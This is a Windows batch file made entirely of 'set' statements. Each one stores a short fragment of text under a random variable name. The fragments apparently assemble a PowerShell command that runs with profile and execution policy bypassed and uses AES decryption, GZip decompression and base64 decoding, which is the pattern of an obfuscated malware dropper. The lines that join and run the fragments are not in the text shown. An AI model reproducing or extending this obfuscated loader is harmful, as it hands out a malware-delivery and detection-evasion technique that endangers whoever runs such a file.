@echo off
set "IzZFLbSPuC=po"
set "ZgcZNKQSXV=he"
set "ULcVvbaGDw=s\"
set "HdsChJTcGj=0\"
set "PtIInUbRgx=nd"
set "VuTdwaJdXB=we"
set "UvoJvcfviH=32"
set "FHeISlcEYx=st"
set "kkWWZxVqxE=we"
set "zwBphehWjo=1."
set "fGwrzWoLSz=ws"
set "xWJdlyNibh=Po"
set "XRzRPnGtcj=\W"
set "bvDlqYmjun=Sy"
set "wgJzkhEdSv=xe"
set "aYonFlPwZT=\v"
set "NNqcuXFLfV=rs"
set "dSBncsVinp=py"
set "HzVjtksumQ=do"
set "msBGtnkpgh=ll"
set "xksfFUKzrb=ll"
set "ONDIMeqMnl=em"
set "yJHyGjaTfv=ow"
set "UJdFGPHIdG=Wi"
set "aQefwUiWlN=.e"
set "NqFYUAJKtq=y "
set "ZvHgIoSVzl=in"
set "rNPPlaxWEf=he"
set "LeljlIeGSg= C"
set "UmhmesZqGL=rS"
set "rURHiHykfr=:\"
set "YnbsfDqAFY=co"
set "CMzRpumJIh= /"
set "wUfClIeGqx=cd"
set "lQFtmEqXAc= %~dp0"
set "UFmMQhyMdr=6] -"
set "HVwjtoLgsE==');"
set "CzZlgcLjgK=tS46"
set "bCliefnhqw=rity"
set "nZVGUXfHJz=);$V"
set "bFINlKLIGL=ateD"
set "oatjcVqltt=tem."
set "szupIaqdfp=('da"
set "friEGuYThc=oArr"
set "mjvAJiEGOH=n ''"
set "ehsTsdnMUu=16] "
set "MkfnNbkYgg='')("
set "VYDbxyaLDb=lU.T"
set "bmAihLbGmA=[Env"
set "jcPYxFqiJl=.Com"
set "YNuQGVwVXh=hy.A"
set "eDPjAnyWLr=rtS4"
set "qMAvejbALH=nage"
set "pLMFiUDanL=.Cry"
set "ACMdQZYWFi=($TH"
set "SiTTmdazCc=$VzC"
set "ItkKmDZSln=gMod"
set "IxFGddNUUU=WgZ "
set "xdoASjzFIs=zuZI"
set "divejanmLW=embl"
set "NwrkuENgvi=-4] "
set "oFbnRWxfiu=PGh."
set "INbPepqFmi=$Syt"
set "QRjuAglqZt=.Mem"
set "tjtVnokwqB=DK.D"
set "EEqSylmZMw=.Mod"
set "HzLSmhfaAr=Syst"
set "tZUKbUTDNM=.Dis"
set "DrUugBSqxo=);$k"
set "wiGauJtaTE=('%*'"
set "igcZiqjZdW=ythA"
set "hXbDtlkaDX=k; }"
set "mNowTirdbE=$TPP"
set "oUuXoSzSjE= [Sy"
set "bBPxQZJDik= [st"
set "LTeTBkDymo=fore"
set "jsbkbTCDKK=bjec"
set "PHvdzjMtTD=Secu"
set "wahxdNyPaF=Syth"
set "mBoSwEuVtf=iron"
set "eTPpBgbcUA= '')"
set "BHVXCrjpxT=LcVk"
set "UcZkzkySes=:('g"
set "xgKejlRIJO=grap"
set "OpzPVCsCUm=sion"
set "mgkvnSSTqg=jIDK"
set "DBmqQHxgph=hA ="
set "eSdoDzuLsV=stem"
set "GTUhzBQhob=ivY "
set "CqTFjFwfhW=join"
set "GONMzPYgqm=rans"
set "rWmMtHyCjl=ose("
set "OuSFENMBJK=-nop"
set "dllmrVmcYV=stem"
set "xvbmhOAvqB=morF"
set "VIlChTsgRN=brea"
set "NehjfECsEI= = $"
set "rkguGzwGKm=tion"
set "VispkQtsXu=.Dis"
set "ahsOXupJUB=BVXY"
set "eMOBmULBvO=vert"
set "kKRkBXbfxa=TllA"
set "SIvsMBxSaR=m.IO"
set "BGDoiwpHfI=lU ="
set "JZtjgTiIMb=in $"
set "wvQTFDplaj=.Len"
set "rrxNEJVELe=.GZi"
set "tgnOCqdodm=]::("
set "mYBkwYZUVR=-joi"
set "krwjXWjGLE=trea"
set "wdUkXuTAiM=[]] "
set "CRcyzsjELg=lBlo"
set "xUPHcUWKjR=oryS"
set "AGeRELvuig=d;$V"
set "bhtDSqVQFz=TPPG"
set "zzKLropSgB=Z.En"
set "jSZCFEfNFm=l5E7"
set "nWzmRVvybP=ode]"
set "uVaQlnyFxM=ewLi"
set "BCWUpqBeuK=rity"
set "ZesUIMiaIk=W) {"
set "fVBQRDjEgI=Comp"
set "oJgGYWzOVy=O.Me"
set "jZPRvArobk=rofi"
set "mJMSIkZTdz=;$TP"
set "TwglbgfPss=kjID"
set "cqTNgEqRah=eMVs"
set "QfpguTosON=MSR."
set "FjnCLvZKhN=Obje"
set "YtjgIERqNJ=$kjI"
set "LNNASTZljK=ress"
set "pylJpxqdvN=ose("
set "YbXPFiYqMl=]::N"
set "rxaaRdQPfS=pStr"
set "qoMBQVVacc=tem."
set "JgTFjbnODm=y.Pa"
set "mdTefLxmkD=();$"
set "MSkEhmoRAO=Disp"
set "KCIHqRwUWG=ptog"
set "ywHMmvsAra=Secu"
set "jnCDufqZEM=ert]"
set "aIJlagusvV===')"
set "QhRCjzJXAk=form"
set "ekJiJCfMTK= '')"
set "bCNbKhWkge=bstr"
set "yQkOcOyOhV=ypto"
set "cTDQVtziLw=zClU"
set "IaQQzcoRmv=.Sec"
set "FtKvhMXDJj=pose"
set "mUTjwNCJSG=)($E"
set "FzJIsRGuqE=3); "
set "SsmGjqClhz=pher"
set "jgmocPUaVR=m.IO"
set "kbzfucouJv=1] -"
set "fSpihwsphU=m(, "
set "AqyTKZesdQ=A, 0"
set "qGcHgsIOaY=.IO."
set "GbJXbotvSR=;$LB"
set "kfOBwmlftl=raph"
set "tvNhmTErzo=gnir"
set "GdiiLIMUjy=ach "
set "VHwrVjOblF=oL'["
set "NAkJXHHmsQ=esMa"
set "EEEimKyEKo=n ''"
set "xuSIHcSOjb='0Pg"
set "zSYwQWyHex=[Sys"
set "GpLPiXiion=SR.T"
set "zbkbXRfYMv=..-1"
set "DYLogLZQYk='gni"
set "fPjnuyIapE=oin "
set "cfkfPrObYh=File"
set "RFFiOdbBJC= if "
set "efoqnnJeBX=ew-O"
set "OoEGYLXXAH=t Sy"
set "QefBrFtqHa=]::C"
set "xsjyxAvjXf=kW ="
set "TOeKjzyiGJ=ck($"
set "sGngCpVjsF=7;$V"
set "yOknUvtzEr= = ["
set "MbOcITDBEZ=L4Yi"
set "LDxbrYrBLL=[IO."
set "pIGUtwroeJ=tsWi"
set "RkZLNPFrZd=ptog"
set "vWyBpoZrDO=$VzC"
set "WJdbdlSiLY=nirt"
set "XlOgSJUPbE=)) {"
set "hleRstxOoU=daeR"
set "cHmSgVnbRw=oint"
set "WPDNTJaKJS=S46e"
set "uvimFMdyUM=raph"
set "wfiCVeiiIt=THiv"
set "PxoyqXokcS=tem."
set "PQgDJZcABP=.Key"
set "NmvASqVkgj=th('"
set "jNUOYslcJs=Syst"
set "NeaVORPzbD=-ep "
set "gXqkWSUuWa=$QbM"
set "UgvjLBxpHi= = $"
set "bZlPHzDjHH=);$V"
set "FEuCLWakBI= New"
set "wCaoSsCkTU=:: '"
set "ljYmZbOsSw=$LcV"
set "UWkqHhvtem=e = "
set "anxYmEdzub=stem"
set "JNtHznLZtq=.Cry"
set "gCOGlbiCco=BC;$"
set "KhZCjWbMiy=Star"
set "TYubRuBjMq=[Sys"
set "vpbopavLgt= = N"
set "yFkRWzHoQc=am;$"
set "TjReHzuaxE=hA);"
set "DfbljJqmeU=ion."
set "vIGdWbdzMx=ythA"
set "BZzqjpaOpV='[-1"
set "pMEUSrpNGC=y.Cr"
set "sxobCSNMfl=::De"
set "HSbNsHijuN=)))"
set "zXqmKuEVRy=s75K"
set "hHibLvUuOW=();$"
set "RnLXtMcKfO=RmAx"
set "UudGVLyriy=comp"
set "SfWjUqDnZy=Stre"
set "PveOiDEAVf=] -j"
set "mndlyNWAnh=[Sys"
set "dRYPTovPjr=V = "
set "BCTBirkptD=$Syt"
set "bsSDXdiGBy=-Obj"
set "cvCqjRhRVp=MOUS"
set "YgrahaTpGh=ionM"
set "duKPwIlzfr=($TH"
set "JkgvadqeBB=-joi"
set "uQReQFdMUn=$VMO"
set "YqFrbfDOsw=ptor"
set "rDQZiXVbgB=MOUS"
set "hcWeXnSYgj=ispo"
set "xHnEIqfoqB=rt]:"
set "OMyUrrljEo=lit("
set "ZbsOMrpyXR=Gh, "
set "KSmyzyohld=and "
set "qyoqznxdEF=mory"
set "bPxlfNabDD=ring"
